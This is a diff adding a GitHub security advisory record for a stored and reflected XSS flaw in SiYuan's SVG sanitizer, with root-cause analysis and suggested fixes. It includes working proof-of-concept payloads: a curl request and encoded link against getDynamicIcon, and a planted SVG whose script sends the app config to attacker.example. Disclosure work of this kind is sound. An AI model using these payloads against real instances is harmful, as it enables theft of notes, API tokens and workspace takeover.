@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-99rq-75j6-5j9f",
+  "modified": "2026-09-03T15:00:09.618650011Z",
+  "published": "2026-09-03T14:53:17Z",
+  "aliases": [
+    "CVE-2026-66394"
+  ],
+  "summary": "SiYuan: Stored and reflected XSS in SiYuan through an SVG sanitizer bypass",
+  "details": "### Summary\nSiYuan cleans user supplied SVG with `util.SanitizeSVG` before it serves the file inline as `image/svg+xml`. This cleaner is the guard behind the `Editor.AllowSVGScript` setting, which is off by default, so a `\u003cscript\u003e` inside an SVG is meant to be removed.\n\nThe cleaner reads the input as HTML, but the browser reads the served file as XML (SVG). Because the two parsers treat some tags differently, a `\u003cscript\u003e` can be hidden so the cleaner never removes it. The cleaned file still holds a working script. When a browser opens that file as an SVG document, the script runs in the app origin. There is no Content Security Policy in the product to stop it.\n\nThe same bug can be reached in two ways. Both share one root cause (the cleaner), so one fix in the cleaner closes both:\n\n* Reflected, through a single link: `GET /api/icon/getDynamicIcon`\n* Stored, through a planted `.svg` asset: `GET /assets/\u003cname\u003e.svg`\n\nI confirmed this on a live SiYuan 3.7.2 kernel.\n\n## Root cause\n\n`util.SanitizeSVG` (`kernel/util/misc.go:319`) parses the string with an HTML parser, walks the element nodes to drop `\u003cscript\u003e`, `\u003ciframe\u003e`, `\u003cforeignobject\u003e`, event handler attributes and so on, then renders it back and cuts out the `\u003csvg\u003e...\u003c/svg\u003e` part.\n\nThe gap comes from HTML parsing rules that do not exist in XML:\n\n* `\u003cdesc\u003e` and `\u003ctitle\u003e` are HTML integration points. Inside them the HTML parser switches back to normal HTML mode. The cleaner drops `\u003cforeignObject\u003e` but keeps `\u003cdesc\u003e` and `\u003ctitle\u003e`.\n* Inside HTML mode, `\u003cstyle\u003e`, `\u003cxmp\u003e` and `\u003cnoscript\u003e` are raw text elements. Their contents are read as plain text, not as child nodes. So the cleaner never sees a `\u003cscript\u003e` placed inside them, and the render step writes it back exactly as it was.\n* When the browser reads the same bytes as XML (SVG), there is no raw text rule. `\u003cstyle\u003e` becomes a normal container and the hidden `\u003cscript\u003e` becomes a real, working SVG script node.\n\nI checked this by building and running the real `SanitizeSVG`. A plain `\u003cscript\u003e` under `\u003csvg\u003e` is removed, but wrapping it in `\u003cdesc\u003e\u003cstyle\u003e` lets it pass through untouched:\n\n```\nIN : \u003csvg\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/svg\u003e\nOUT: \u003csvg\u003e\u003c/svg\u003e                                                     (removed)\n\nIN : \u003csvg\u003e\u003cdesc\u003e\u003cstyle\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/style\u003e\u003c/desc\u003e\u003c/svg\u003e\nOUT: \u003csvg\u003e\u003cdesc\u003e\u003cstyle\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\u003c/style\u003e\u003c/desc\u003e\u003c/svg\u003e   (kept, runs)\n```\n\nTwo places serve SVG through this cleaner, and both only require `CheckAuth`, which allows Administrator, Editor and Reader roles:\n\n* `kernel/server/serve.go:703` `serveSVG` serves an asset inline as `image/svg+xml`.\n* `kernel/api/icon.go:158` `getDynamicIcon`. For `type=8` the `content` query value is put straight into the SVG template at `icon.go:583` with no escaping, then cleaned, then served as `image/svg+xml`.\n\n## Attack vector 1: reflected (one link)\n\nThe `content` value in `getDynamicIcon` is reflected as is and survives the cleaner. A signed in user only has to open one link.\n\n```\ncurl -sk -G 'http://127.0.0.1:6806/api/icon/getDynamicIcon' \\\n  --data-urlencode 'type=8' \\\n  --data-urlencode 'content=\u003c/text\u003e\u003cdesc\u003e\u003cstyle\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003c/style\u003e\u003c/desc\u003e\u003ctext\u003e'\n```\n\nThe response is `HTTP/1.1 200 OK`, `Content-Type: image/svg+xml`, and the body holds a live script:\n\n```xml\n\u003ctext ...\u003e\u003c/text\u003e\u003cdesc\u003e\u003cstyle\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003c/style\u003e\u003c/desc\u003e\u003ctext\u003e\u003c/text\u003e\n```\n\nOpen this in a browser as a signed in user (or on an instance with no lock screen code) to see it run:\n\n```\nhttp://\u003chost\u003e:6806/api/icon/getDynamicIcon?type=8\u0026content=%3C%2Ftext%3E%3Cdesc%3E%3Cstyle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Fdesc%3E%3Ctext%3E\n```\n\n## Attack vector 2: stored (planted asset)\n\nPlace this file as `data/assets/evil.svg`:\n\n```xml\n\u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e\u003cdesc\u003e\u003cstyle\u003e\u003cscript\u003e\nfetch('/api/system/getConf',{method:'POST'}).then(r=\u003er.text())\n  .then(t=\u003e{new Image().src='https://attacker.example/?'+encodeURIComponent(t)});\n\u003c/script\u003e\u003c/style\u003e\u003c/desc\u003e\u003c/svg\u003e\n```\n\nThen open `/assets/evil.svg`. The script runs. The asset can arrive by admin upload, or by a lower trust path such as an imported template, a `.sy.zip`, or a synced asset that carries a booby trapped SVG.\n\nNote for both vectors: an SVG script runs on direct navigation, `\u003ciframe\u003e`, `\u003cembed\u003e` or `\u003cobject\u003e`. It does not run when the SVG is loaded through an `\u003cimg\u003e` tag, so open the link directly or embed it in a frame.\n\n## Impact\n\n* A note or asset made by one user can run any JavaScript in another user's browser on the publish site. This is the publishing threat model.\n* Script in the app origin can call the signed in kernel API, so it can read and write notes and files, read the config, and steal the API token. In the desktop app origin this means full workspace takeover.\n* The default `AllowSVGScript=false` exists to stop SVG scripts, and this bypass removes that protection. There is no CSP as a backup.\n\n## Suggested fix\n\n* Do not use an HTML parse and re render cleaner for content that the browser reads as XML or SVG. Clean it as XML, or use a trusted SVG cleaner, and also drop `\u003cdesc\u003e`, `\u003ctitle\u003e` and `\u003cforeignObject\u003e` and any raw text smuggled markup.\n* Serve user SVG with `Content-Disposition: attachment` and a non running content type, and add a strict `script-src` CSP on `/assets/*` and `/api/icon/getDynamicIcon`.\n* Escape the reflected `content` value in `getDynamicIcon` before it goes into the template.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/siyuan-note/siyuan/kernel",
+        "purl": "pkg:golang/github.com/siyuan-note/siyuan/kernel"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260714095344-f08dee71ba8e"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-99rq-75j6-5j9f/GHSA-99rq-75j6-5j9f.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-99rq-75j6-5j9f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/commit/f08dee71ba8e087a395d74f121de11e6a997ef14"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/siyuan-note/siyuan"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/siyuan-note/siyuan/releases/tag/v3.7.3"
+    }
+  ]
+}
